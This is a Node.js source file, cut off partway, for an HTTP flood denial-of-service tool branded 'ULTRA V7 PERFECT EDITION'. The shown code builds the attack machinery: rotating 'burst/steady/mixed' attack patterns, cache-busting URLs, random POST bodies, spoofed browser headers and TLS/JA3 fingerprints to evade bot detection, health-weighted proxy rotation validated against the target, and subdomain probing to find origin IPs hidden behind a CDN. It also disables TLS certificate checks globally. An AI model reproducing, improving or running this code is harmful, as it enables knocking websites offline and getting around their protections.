#!/usr/bin/env node

const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const readline = require('readline');
const fs = require('fs').promises;
const dns = require('dns').promises;
const crypto = require('crypto');
const { URL } = require('url');

// Disable TLS certificate validation globally to prevent "unable to verify leaf signature" errors
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ANSI Color Codes for beautiful output
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    bgRed: '\x1b[41m',
    bgGreen: '\x1b[42m',
    bgYellow: '\x1b[43m',
    bgBlue: '\x1b[44m'
};

const icons = {
    success: '✓',
    error: '✗',
    warning: '⚠',
    info: 'ℹ',
    rocket: '→',
    fire: '⚡',
    target: '◉',
    clock: '⏱',
    chart: '▶',
    check: '●'
};

const BANNER = `
${colors.cyan}${colors.bright}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║     ${colors.magenta}██╗   ██╗██╗  ████████╗██████╗  █████╗     ██╗   ██╗███████╗${colors.cyan}    ║
║     ${colors.magenta}██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██║   ██║╚════██║${colors.cyan}    ║
║     ${colors.magenta}██║   ██║██║     ██║   ██████╔╝███████║    ██║   ██║    ██╔╝${colors.cyan}    ║
║     ${colors.magenta}██║   ██║██║     ██║   ██╔══██╗██╔══██║    ╚██╗ ██╔╝   ██╔╝${colors.cyan}     ║
║     ${colors.magenta}╚██████╔╝███████╗██║   ██║  ██║██║  ██║     ╚████╔╝    ██║${colors.cyan}      ║
║      ${colors.magenta}╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝      ╚═══╝     ╚═╝${colors.cyan}      ║
║                                                                  ║
║        ${colors.yellow}${colors.bright}PERFECT EDITION${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.green}Smart AI${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.blue}Adaptive Engine${colors.cyan}        ║
║                                                                  ║
║  ${colors.green}${icons.success} Adaptive Concurrency${colors.cyan}     ${colors.green}${icons.success} HTTP/2 Support${colors.cyan}                  ║
║  ${colors.green}${icons.success} Weighted Proxy Select${colors.cyan}    ${colors.green}${icons.success} Session Emulation${colors.cyan}               ║
║  ${colors.green}${icons.success} Pattern Rotation${colors.cyan}         ${colors.green}${icons.success} Exponential Backoff${colors.cyan}             ║
║  ${colors.green}${icons.success} Random POST Bodies${colors.cyan}       ${colors.green}${icons.success} TLS Fingerprinting${colors.cyan}              ║
║  ${colors.green}${icons.success} Cookie Redirect Tracking${colors.cyan} ${colors.green}${icons.success} JA3 Randomization${colors.cyan}               ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
${colors.reset}
`;

const BROWSER_PROFILES = [
    {
        name: 'Chrome 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'e3b0c44298fc1c149afbf4c8996fb924',
        webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620, OpenGL 4.1)'
    },
    {
        name: 'Firefox 121 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'TE': 'trailers'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '7f83b1657ff1fc53b92dc18148a1d65d',
        webgl: 'Mozilla'
    },
    {
        name: 'Chrome 119 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'a1b2c3d4e5f6789012345678901234ab',
        webgl: 'ANGLE (Apple, Apple M1, OpenGL 4.1)'
    },
    {
        name: 'Safari 17 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '9f86d081884c7d659a2feaa0c55ad015',
        webgl: 'Apple GPU'
    },
    {
        name: 'Edge 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'b94d27b9934d3e08a52e52d7da7dabfa',
        webgl: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1660, OpenGL 4.5)'
    }
];

const config = {
    proxies: [],
    workingProxies: new Set(),
    proxyHealth: new Map(),
    proxyBanList: new Map(), // Temporary bans with timestamps
    debug: false,
    http2Sessions: new Map(),
    connectionPool: new Map(),
    dnsCache: new Map(),
    maxRPS: null,
    attackPattern: 'burst', // burst, steady, mixed
    patternStartTime: Date.now(),
    stats: {
        totalRequests: 0,
        successful: 0,
        failed: 0,
        bytesSent: 0,
        bytesReceived: 0,
        statusCodes: {},
        startTime: null,
        http2Requests: 0,
        connectionReuse: 0,
        adaptiveMetrics: {
            lastSuccessRate: 100,
            currentConcurrency: 5
        }
    }
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function question(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function createProgressBar(current, total, width = 40) {
    const percentage = Math.min((current / total) * 100, 100);
    const filled = Math.floor((width * current) / total);
    const empty = width - filled;
    
    let bar = '[';
    bar += colors.green + '█'.repeat(filled) + colors.reset;
    bar += colors.dim + '░'.repeat(empty) + colors.reset;
    bar += ']';
    
    const percentStr = `${percentage.toFixed(1)}%`;
    return `${bar} ${colors.cyan}${percentStr}${colors.reset}`;
}

function getAdvancedHeaders(url, profile = null) {
    if (!profile) profile = getRandomElement(BROWSER_PROFILES);
    
    const headers = {
        'User-Agent': profile.ua,
        'Accept': profile.headers['Accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': getRandomElement(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5']),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': getRandomElement(['document', 'empty']),
        'Sec-Fetch-Mode': getRandomElement(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': getRandomElement(['none', 'same-origin', 'cross-site', 'same-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': getRandomElement(['max-age=0', 'no-cache', 'no-store']),
        'Pragma': 'no-cache',
        ...profile.headers
    };
    
    if (profile.canvas) {
        headers['X-Canvas-Fingerprint'] = profile.canvas;
    }
    
    if (profile.webgl) {
        headers['X-WebGL-Vendor'] = profile.webgl;
    }
    
    if (Math.random() > 0.7) {
        headers['X-Requested-With'] = 'XMLHttpRequest';
    }
    
    if (Math.random() > 0.5) {
        headers['Referer'] = url;
    }
    
    if (profile.name.includes('Chrome') || profile.name.includes('Edge')) {
        headers['sec-ch-ua-arch'] = '"x86"';
        headers['sec-ch-ua-bitness'] = '"64"';
        headers['sec-ch-ua-model'] = '""';
    }
    
    return headers;
}

function addCacheBuster(url) {
    const separator = url.includes('?') ? '&' : '?';
    const params = [
        `_=${Date.now()}`,
        `rand=${Math.floor(Math.random() * 900000) + 100000}`,
        `nocache=${crypto.randomBytes(4).toString('hex')}`
    ];
    return url + separator + getRandomElement(params);
}

function generateRandomPostData() {
    const templates = [
        () => JSON.stringify({
            query: crypto.randomBytes(20).toString('hex'),
            filters: Array(Math.floor(Math.random() * 5) + 1).fill(0).map(() => crypto.randomBytes(8).toString('hex')),
            timestamp: Date.now()
        }),
        () => JSON.stringify({
            action: getRandomElement(['search', 'update', 'submit', 'verify']),
            data: crypto.randomBytes(Math.floor(Math.random() * 100) + 50).toString('base64'),
            session: crypto.randomBytes(16).toString('hex')
        }),
        () => 'data=' + 'x'.repeat(Math.floor(Math.random() * 4900) + 100)
    ];
    return getRandomElement(templates)();
}

function createTLSAgent(profile, proxyUrl = null) {
    const cacheKey = `${proxyUrl || 'direct'}_${profile.name}`;
    
    if (config.connectionPool.has(cacheKey)) {
        const cached = config.connectionPool.get(cacheKey);
        if (Date.now() - cached.created < 120000) {
            config.stats.connectionReuse++;
            return cached.agent;
        }
        config.connectionPool.delete(cacheKey);
    }
    
    const tlsOptions = {
        rejectUnauthorized: false,
        ciphers: profile.tls.ciphers,
        minVersion: profile.tls.minVersion,
        maxVersion: profile.tls.maxVersion,
        ecdhCurve: profile.tls.ecdhCurve,
        honorCipherOrder: true,
        sessionTimeout: 300,
        keepAlive: true,
        keepAliveMsecs: 1000,
        maxSockets: 1024,
        maxFreeSockets: 512,
        timeout: 5000,
        scheduling: 'fifo'
    };
    
    if (profile.tls.sigalgs) {
        tlsOptions.sigalgs = profile.tls.sigalgs;
    }
    
    let agent;
    if (proxyUrl) {
        // For HTTPS proxies, pass TLS options for target connection
        const proxyOptions = {
            rejectUnauthorized: false,
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: 1024,
            maxFreeSockets: 512,
            timeout: 5000
        };
        
        if (proxyUrl.startsWith('https')) {
            agent = new HttpsProxyAgent(proxyUrl, {
                ...proxyOptions,
                // TLS options for connection to target through proxy
                ...tlsOptions
            });
        } else {
            // HTTP proxy - TLS options apply to target connection
            agent = new HttpProxyAgent(proxyUrl, proxyOptions);
            // Store TLS options separately for target connection
            agent.tlsOptions = tlsOptions;
        }
    } else {
        agent = new https.Agent(tlsOptions);
    }
    
    config.connectionPool.set(cacheKey, {
        agent,
        created: Date.now()
    });
    
    return agent;
}

async function createHTTP2Session(targetUrl, proxyUrl = null) {
    const cacheKey = `${targetUrl}_${proxyUrl || 'direct'}`;
    
    if (config.http2Sessions.has(cacheKey)) {
        const session = config.http2Sessions.get(cacheKey);
        if (!session.destroyed && !session.closed) {
            return session;
        }
        config.http2Sessions.delete(cacheKey);
    }
    
    return new Promise((resolve, reject) => {
        const url = new URL(targetUrl);
        const session = http2.connect(url.origin, {
            rejectUnauthorized: false,
            maxSessionMemory: 1000
        });
        
        session.on('error', (err) => {
            config.http2Sessions.delete(cacheKey);
            reject(err);
        });
        
        session.setTimeout(20000, () => {
            session.close();
            config.http2Sessions.delete(cacheKey);
        });
        
        config.http2Sessions.set(cacheKey, session);
        resolve(session);
    });
}

function addRealisticDelay() {
    return new Promise(resolve => {
        const delay = Math.floor(Math.random() * 50) + 10;
        setTimeout(resolve, delay);
    });
}

async function resolveViaDoH(domain) {
    if (config.dnsCache.has(domain)) {
        return config.dnsCache.get(domain);
    }
    
    try {
        const dohProviders = [
            'https://cloudflare-dns.com/dns-query',
            'https://dns.google/resolve',
            'https://dns.quad9.net/dns-query'
        ];
        
        const provider = getRandomElement(dohProviders);
        const response = await axios.get(provider, {
            params: { name: domain, type: 'A' },
            headers: { 'Accept': 'application/dns-json' },
            timeout: 3000
        });
        
        if (response.data && response.data.Answer) {
            const ip = response.data.Answer[0].data;
            config.dnsCache.set(domain, ip);
            return ip;
        }
    } catch (err) {
        // Fallback to system DNS
    }
    
    return domain;
}

function updateProxyHealth(proxyUrl, success, latency) {
    if (!config.proxyHealth.has(proxyUrl)) {
        config.proxyHealth.set(proxyUrl, {
            success: 0,
            fails: 0,
            totalLatency: 0,
            requests: 0,
            score: 100
        });
    }
    
    const health = config.proxyHealth.get(proxyUrl);
    health.requests++;
    
    if (success) {
        health.success++;
        health.totalLatency += latency;
    } else {
        health.fails++;
    }
    
    const successRate = health.success / health.requests;
    const avgLatency = health.totalLatency / health.success || 9999;
    health.score = (successRate * 70) + ((1000 - Math.min(avgLatency, 1000)) / 1000 * 30);
}

function rotateAttackPattern() {
    const elapsed = Date.now() - config.patternStartTime;
    const cycleTime = 30000; // 30 second cycles
    
    if (elapsed > cycleTime) {
        const patterns = ['burst', 'steady', 'mixed'];
        const currentIndex = patterns.indexOf(config.attackPattern);
        config.attackPattern = patterns[(currentIndex + 1) % patterns.length];
        config.patternStartTime = Date.now();
        
        if (config.debug) {
            console.log(`[PATTERN] Switched to ${config.attackPattern.toUpperCase()} mode`);
        }
    }
    
    // Return delay based on pattern
    switch (config.attackPattern) {
        case 'burst': return 0;
        case 'steady': return 50;
        case 'mixed': return Math.random() > 0.5 ? 0 : 25;
        default: return 0;
    }
}

function getHealthyProxy() {
    if (config.proxies.length === 0) return null;
    
    const now = Date.now();
    
    // Filter out banned and unhealthy proxies
    const availableProxies = config.proxies.filter(proxy => {
        // Check if banned
        if (config.proxyBanList.has(proxy)) {
            const banUntil = config.proxyBanList.get(proxy);
            if (now < banUntil) return false;
            config.proxyBanList.delete(proxy); // Unban
        }
        
        const health = config.proxyHealth.get(proxy);
        return !health || health.score > 30;
    });
    
    if (availableProxies.length === 0) {
        config.proxyHealth.clear();
        config.proxyBanList.clear();
        return getRandomElement(config.proxies);
    }
    
    // Weighted random selection (best proxies used 3x more often)
    const weights = availableProxies.map(proxy => {
        const score = config.proxyHealth.get(proxy)?.score || 100;
        return Math.pow(score / 100, 2); // Square to emphasize differences
    });
    
    const totalWeight = weights.reduce((a, b) => a + b, 0);
    let random = Math.random() * totalWeight;
    
    for (let i = 0; i < availableProxies.length; i++) {
        random -= weights[i];
        if (random <= 0) return availableProxies[i];
    }
    
    return availableProxies[0];
}

async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateProxies = false) {
    try {
        const data = await fs.readFile(filePath, 'utf-8');
        const raw = data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
        
        if (raw.length === 0) {
            console.log('[!] No proxies found in proxies.txt');
            console.log('[!] Format: ip:port (one per line)');
            return false;
        }
        
        console.log('\n' + colors.cyan + '═'.repeat(70) + colors.reset);
        console.log(`${colors.bright}${colors.blue}${icons.rocket} LOADING PROXIES${colors.reset}`);
        console.log(colors.cyan + '═'.repeat(70) + colors.reset);
        
        const proxyList = raw.map(proxy => 
            proxy.startsWith('http') ? proxy : `http://${proxy}`
        );
        
        if (!validateProxies || !targetUrl) {
            config.proxies = proxyList;
            console.log(`${colors.green}${icons.success} Loaded ${colors.bright}${config.proxies.length}${colors.reset}${colors.green} proxies (no validation)${colors.reset}`);
            console.log(`${colors.blue}${icons.info} Proxies will be used in rotation during attack${colors.reset}`);
            console.log(colors.cyan + '═'.repeat(70) + colors.reset + '\n');
            return true;
        }
        
        console.log(`${colors.yellow}${icons.target} Validating ${colors.bright}${proxyList.length}${colors.reset}${colors.yellow} proxies against target...${colors.reset}`);
        console.log(`${colors.blue}${icons.info} Testing: ${colors.bright}${targetUrl}${colors.reset}`);
        console.log(`${colors.magenta}${icons.fire} Mode: ${colors.bright}PRECISION${colors.reset}${colors.magenta} - 2-phase validation${colors.reset}`);
        console.log(`${colors.dim}${icons.clock} Phase 1: 800ms | Phase 2: 1500ms | Concurrency: 1500${colors.reset}`);
        console.log(colors.cyan + '═'.repeat(70) + colors.reset + '\n');
        
        const startTime = Date.now();
        const chunkSize = 1500;
        let totalValid = 0;
        let totalTested = 0;
        const proxyMetrics = new Map(); // Store latency and status for sorting
        
        // Phase 1: Ultra-fast dead proxy elimination
        console.log(`${colors.bright}${colors.yellow}[PHASE 1]${colors.reset} ${colors.yellow}Eliminating dead proxies...${colors.reset}`);
        const phase1Start = Date.now();
        const aliveProxies = [];
        
        for (let i = 0; i < proxyList.length; i += chunkSize) {
            const chunk = proxyList.slice(i, i + chunkSize);
            
            const results = await Promise.all(
                chunk.map(async (proxy) => {
                    const testStart = Date.now();
                    try {
                        const agent = proxy.startsWith('https') 
                            ? new HttpsProxyAgent(proxy, { rejectUnauthorized: false, timeout: 800 })
                            : new HttpProxyAgent(proxy, { timeout: 800 });
                        
                        const response = await axios.get(targetUrl, {
                            httpAgent: agent,
                            httpsAgent: agent,
                            timeout: 800,
                            validateStatus: () => true,
                            maxRedirects: 2
                        });
                        
                        const latency = Date.now() - testStart;
                        return { proxy, alive: true, latency, status: response.status };
                    } catch (error) {
                        return { proxy, alive: false };
                    }
                })
            );
            
            results.forEach(result => {
                if (result.alive) {
                    aliveProxies.push(result.proxy);
                    proxyMetrics.set(result.proxy, { 
                        latency: result.latency, 
                        status: result.status,
                        score: 0 
                    });
                }
            });
            
            const progress = Math.min(i + chunkSize, proxyList.length);
            const speed = Math.floor(progress / (Date.now() - phase1Start) * 1000);
            const progressBar = createProgressBar(progress, proxyList.length, 35);
            process.stdout.write(`\r  ${progressBar} ${colors.green}${aliveProxies.length} alive${colors.reset} ${colors.dim}│${colors.reset} ${colors.cyan}${speed}/s${colors.reset}`);
        }
        
        const phase1Time = ((Date.now() - phase1Start) / 1000).toFixed(1);
        const eliminatedCount = proxyList.length - aliveProxies.length;
        const eliminatedPercent = ((eliminatedCount / proxyList.length) * 100).toFixed(1);
        
        console.log(`\n  ${colors.green}${icons.success} Eliminated ${colors.red}${eliminatedCount}${colors.reset}${colors.green} dead proxies (${eliminatedPercent}%) in ${colors.bright}${phase1Time}s${colors.reset}\n`);
        
        if (aliveProxies.length === 0) {
            console.log(`${colors.red}${icons.error} NO ALIVE PROXIES FOUND!${colors.reset}\n`);
            return false;
        }
        
        // Phase 2: Speed and reliability test on alive proxies
        console.log(`${colors.bright}${colors.green}[PHASE 2]${colors.reset} ${colors.green}Testing ${colors.bright}${aliveProxies.length}${colors.reset}${colors.green} alive proxies for speed & reliability...${colors.reset}`);
        const phase2Start = Date.now();
        
        for (let i = 0; i < aliveProxies.length; i += chunkSize) {
            const chunk = aliveProxies.slice(i, i + chunkSize);
            const batchNum = Math.floor(i / chunkSize) + 1;
            const totalBatches = Math.ceil(aliveProxies.length / chunkSize);
            
            console.log(`\n${colors.cyan}${icons.chart} Batch ${batchNum}/${totalBatches}${colors.reset} ${colors.dim}(${chunk.length} proxies)${colors.reset}`);
            
            const results = await Promise.all(
                chunk.map(async (proxy) => {
                    const testStart = Date.now();
                    try {
                        const agent = proxy.startsWith('https') 
                            ? new HttpsProxyAgent(proxy, { rejectUnauthorized: false, timeout: 1500 })
                            : new HttpProxyAgent(proxy, { timeout: 1500 });
                        
                        const response = await axios.get(targetUrl, {
                            httpAgent: agent,
                            httpsAgent: agent,
                            timeout: 1500,
                            validateStatus: () => true,
                            maxRedirects: 3
                        });
                        
                        const latency = Date.now() - testStart;
                        
                        // Calculate quality score (lower latency + good status = higher score)
                        let score = 100;
                        score -= (latency / 10); // Subtract 10 points per 100ms
                        if (response.status >= 200 && response.status < 300) score += 20;
                        else if (response.status >= 400 && response.status < 500) score -= 10;
                        else if (response.status >= 500) score -= 30;
                        
                        return { proxy, valid: true, latency, status: response.status, score: Math.max(0, score) };
                    } catch (error) {
                        return { proxy, valid: false, error: error.code };
                    }
                })
            );
            
            const batchValid = [];
            let fastCount = 0, mediumCount = 0, slowCount = 0;
            
            results.forEach(result => {
                if (result.valid) {
                    proxyMetrics.set(result.proxy, {
                        latency: result.latency,
                        status: result.status,
                        score: result.score
                    });
                    config.proxies.push(result.proxy);
                    batchValid.push(result.proxy.replace(/^https?:\/\//, ''));
                    totalValid++;
                    
                    // Categorize by speed
                    if (result.latency < 500) fastCount++;
                    else if (result.latency < 1000) mediumCount++;
                    else slowCount++;
                }
            });
            
            totalTested += chunk.length;
            const elapsed = ((Date.now() - phase2Start) / 1000).toFixed(1);
            const speed = Math.floor(totalTested / (Date.now() - phase2Start) * 1000);
            const remaining = aliveProxies.length - totalTested;
            const eta = remaining > 0 ? Math.ceil(remaining / speed) : 0;
            
            if (batchValid.length > 0) {
                console.log(`  ${colors.green}${icons.success} Validated ${colors.bright}${batchValid.length}${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}Fast: ${fastCount}${colors.reset} ${colors.dim}│${colors.reset} ${colors.yellow}Medium: ${mediumCount}${colors.reset} ${colors.dim}│${colors.reset} ${colors.red}Slow: ${slowCount}${colors.reset}`);
            } else {
                console.log(`  ${colors.red}${icons.error} Validated 0 proxies in this batch${colors.reset}`);
            }
            
            const progressBar = createProgressBar(totalTested, aliveProxies.length, 30);
            console.log(`  ${progressBar} ${colors.cyan}${speed}/s${colors.reset} ${colors.dim}│ ETA: ${eta}s${colors.reset}`);
        }
        
        // Sort proxies by quality score
        config.proxies.sort((a, b) => {
            const scoreA = proxyMetrics.get(a)?.score || 0;
            const scoreB = proxyMetrics.get(b)?.score || 0;
            return scoreB - scoreA;
        });
        
        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
        const avgSpeed = Math.floor(proxyList.length / (Date.now() - startTime) * 1000);
        const finalRate = ((config.proxies.length / proxyList.length) * 100).toFixed(1);
        
        console.log('\n' + colors.cyan + '═'.repeat(70) + colors.reset);
        console.log(`${colors.bright}${colors.green}${icons.success} VALIDATION COMPLETE - PROXIES SORTED BY QUALITY${colors.reset}`);
        console.log(colors.cyan + '═'.repeat(70) + colors.reset);
        console.log(`${colors.blue}${icons.clock} Total Time: ${colors.bright}${totalTime}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.blue}Avg Speed: ${colors.bright}${avgSpeed} p/s${colors.reset}`);
        console.log(`${colors.green}${icons.check} Result: ${colors.bright}${config.proxies.length}${colors.reset}${colors.green}/${proxyList.length} working ${colors.dim}(${finalRate}%)${colors.reset}`);
        
        if (config.proxies.length > 0) {
            // Show top 5 best proxies with their metrics
            console.log(`\n${colors.bright}${colors.yellow}[TOP 5 BEST PROXIES]${colors.reset}`);
            const top5 = config.proxies.slice(0, 5);
            top5.forEach((proxy, idx) => {
                const metrics = proxyMetrics.get(proxy);
                const proxyIP = proxy.replace(/^https?:\/\//, '');
                const quality = metrics.score > 80 ? `${colors.green}EXCELLENT` : metrics.score > 60 ? `${colors.yellow}GOOD` : `${colors.red}AVERAGE`;
                const medal = idx === 0 ? '🥇' : idx === 1 ? '🥈' : idx === 2 ? '🥉' : `${colors.dim}${idx + 1}.${colors.reset}`;
                console.log(`  ${medal} ${colors.cyan}${proxyIP.padEnd(25)}${colors.reset} ${colors.dim}│${colors.reset} ${colors.blue}${metrics.latency}ms${colors.reset} ${colors.dim}│${colors.reset} Status ${colors.magenta}${metrics.status}${colors.reset} ${colors.dim}│${colors.reset} Score ${quality} ${metrics.score.toFixed(1)}${colors.reset}`);
            });
            
            // Speed distribution
            const fast = config.proxies.filter(p => proxyMetrics.get(p).latency < 500).length;
            const medium = config.proxies.filter(p => {
                const lat = proxyMetrics.get(p).latency;
                return lat >= 500 && lat < 1000;
            }).length;
            const slow = config.proxies.length - fast - medium;
            
            console.log(`\n${colors.bright}${colors.magenta}[SPEED DISTRIBUTION]${colors.reset}`);
            console.log(`  ${colors.green}${icons.fire} Fast (<500ms):   ${colors.bright}${fast}${colors.reset}${colors.green} proxies ${colors.dim}(${((fast / config.proxies.length) * 100).toFixed(1)}%)${colors.reset}`);
            console.log(`  ${colors.yellow}${icons.fire} Medium (500-1s): ${colors.bright}${medium}${colors.reset}${colors.yellow} proxies ${colors.dim}(${((medium / config.proxies.length) * 100).toFixed(1)}%)${colors.reset}`);
            console.log(`  ${colors.red}${icons.fire} Slow (>1s):      ${colors.bright}${slow}${colors.reset}${colors.red} proxies ${colors.dim}(${((slow / config.proxies.length) * 100).toFixed(1)}%)${colors.reset}`);
        }
        console.log(colors.cyan + '═'.repeat(70) + colors.reset + '\n');
        
        if (config.proxies.length === 0) {
            console.log('[!] NO WORKING PROXIES FOUND!');
            console.log('[!] All proxies failed to connect to target');
            console.log('[!] Try different proxies or continue without proxies\n');
            return false;
        }
        
        return true;
    } catch (err) {
        console.log('[!] proxies.txt not found!');
        console.log('[!] Create proxies.txt with format: ip:port (one per line)\n');
        return false;
    }
}

async function discoverOriginIPs(domain) {
    console.log(`[*] Discovering origin IPs for ${domain}...`);
    const foundIPs = new Set();
    
    const subdomains = [
        'direct', 'origin', 'direct-connect', 'direct-origin',
        'dev', 'staging', 'test', 'beta', 'alpha',
        'admin', 'panel', 'cpanel', 'webmail',
        'mail', 'smtp', 'ftp', 'api', 'api2'
    ];
    
    console.log(`[*] Scanning ${subdomains.length} subdomains...`);
    
    const cdnRanges = ['104.', '172.', '162.', '13.', '34.', '35.', '54.', '52.', '23.', '95.', '96.', '151.'];
    
    await Promise.all(subdomains.map(async sub => {
        try {
            const testDomain = `${sub}.${domain}`;
            const addresses = await dns.resolve4(testDomain);
            addresses.forEach(ip => {
                if (!cdnRanges.some(range => ip.startsWith(range))) {
                    foundIPs.add(ip);
                    console.log(`  [+] Found: ${testDomain} -> ${ip}`);
                }
            });
        } catch {}
    }));
    
    try {
        const mainIPs = await dns.resolve4(domain);
        mainIPs.forEach(ip => foundIPs.add(ip));
    } catch {}
    
    if (foundIPs.size > 0) {
        console.log(`[+] Discovered ${foundIPs.size} potential origin IPs`);
        return Array.from(foundIPs);
    } else {
        console.log('[!] No origin IPs found, using domain directly');
        return [domain];
    }
}

function updateStats(success, statusCode = null, bytesSent = 0, bytesReceived = 0) {
    config.stats.totalRequests++;
    if (success) {
        config.stats.successful++;
